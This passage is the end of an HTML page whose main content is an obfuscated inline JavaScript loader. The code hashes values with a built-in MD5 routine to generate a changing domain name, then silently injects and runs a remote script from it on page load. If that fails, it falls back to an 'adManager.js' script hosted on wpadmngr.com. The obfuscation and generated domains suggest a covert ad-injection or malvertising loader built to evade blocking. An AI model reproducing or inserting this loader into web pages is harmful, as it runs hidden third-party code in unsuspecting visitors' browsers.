v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>